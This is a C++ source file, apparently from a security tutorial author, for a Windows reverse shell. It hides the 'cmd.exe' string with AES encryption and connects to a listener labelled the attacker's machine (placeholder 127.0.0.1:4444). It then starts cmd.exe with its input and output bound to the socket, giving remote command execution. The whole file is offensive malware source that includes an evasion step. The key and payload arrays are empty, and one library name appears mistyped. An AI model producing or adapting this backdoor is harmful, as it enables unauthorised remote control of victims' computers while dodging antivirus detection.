/*
shell-aes.cpp
author: @cocomelonc
windows reverse shell with AES encryption example
*/
#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#include <wincrypt.h>
#pragma comment(lib, "w2_32")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

// encrypted command cmd.exe (with AES)
unsigned char myCmd[] = { };
unsigned int myCmdL = sizeof(myCmd);

// AES key
unsigned char mySecretKey[] = { };

// AES decrypt
int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen) {
  HCRYPTPROV hProv;
  HCRYPTHASH hHash;
  HCRYPTKEY hKey;

  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
    return -1;
  }
  if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
    return -1;
  }
  if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
    return -1;
  }
  if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
    return -1;
  }
  if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, data, &data_len)){
    return -1;
  }

  CryptReleaseContext(hProv, 0);
  CryptDestroyHash(hHash);
  CryptDestroyKey(hKey);

  return 0;
}

int main(int argc, char* argv[])
{
  // decrypt command
  AESDecrypt((char *) myCmd, myCmdL, mySecretKey, sizeof(mySecretKey));

  // listener ip, port on attacker's machine
  char *ip = "127.0.0.1";
  short port = 4444;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to a attacker's host port
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  char command[8] = "";
  snprintf( command, sizeof(command), "%s", myCmd);

  // start cmd.exe (decrypted) with redirected streams
  CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}
